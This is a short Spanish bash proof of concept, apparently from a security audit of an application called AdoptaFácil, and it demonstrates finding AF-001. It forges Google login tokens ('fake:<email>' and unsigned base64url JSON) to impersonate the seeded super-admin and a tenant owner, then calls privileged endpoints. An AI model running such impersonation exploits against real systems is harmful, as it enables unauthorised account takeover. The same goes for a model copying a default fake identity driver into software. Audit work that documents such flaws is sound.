#!/bin/bash
# AF-001: suplantación vía POST /auth/google con token "fake:<correo>:x" (AUTH_IDENTITY_DRIVER default = fake)
source ${AUDIT_DIR:-./auditoria-seguridad}/scripts/env.sh
echo "## token fake para el PlatformSuperAdmin semilla"
T=$(curl -s -X POST $API/auth/google -H 'content-type: application/json' -d '{"idToken":"fake:admin@adoptafacil.local:atacante"}' | tee /dev/stderr | jq -r .tokens.accessToken); echo
echo "## con ese token: /rbac/my-roles y /platform/dashboard/super-admin"
curl -s $API/rbac/my-roles -H "authorization: Bearer $T"; echo
curl -s -w ' HTTP %{http_code}' $API/platform/dashboard/super-admin -H "authorization: Bearer $T" | head -c 600; echo
echo "## variante base64url JSON (sin prefijo fake:) para el Owner de Tenant A"
TOK=$(printf '{"email":"owner.a@tenant-a.test","name":"x","emailVerified":true}' | base64 -w0 | tr '+/' '-_' | tr -d '=')
curl -s -X POST $API/auth/google -H 'content-type: application/json' -d "{\"idToken\":\"$TOK\"}" | jq -c '{email:.user.email, org:.user.organizationId, type:.user.accountType}'
